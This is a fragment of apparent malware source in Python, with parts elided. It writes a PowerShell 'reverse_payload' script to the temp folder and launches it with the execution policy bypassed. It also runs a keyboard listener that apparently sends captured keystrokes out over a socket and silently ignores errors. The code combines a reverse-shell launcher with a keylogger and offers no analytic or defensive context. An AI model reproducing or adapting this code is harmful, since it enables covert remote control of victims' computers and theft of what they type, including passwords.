...
$client.Close()
'''
                    ps_script_path = os.path.join(os.environ['TEMP'], 'reverse_payload.ps1')
                    with open(ps_script_path, 'w') as ps_file:
                        ps_file.write(reverse_payload)

                    os.system(f'powershell -ExecutionPolicy Bypass -File {ps_script_path}')
                else:
...
def listen_keyboard(mysocket):
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            ...
            Thread(target=func_handle_time, args=(20.0, listener, mysocket)).start()
            listener.join()
    except Exception:
        pass
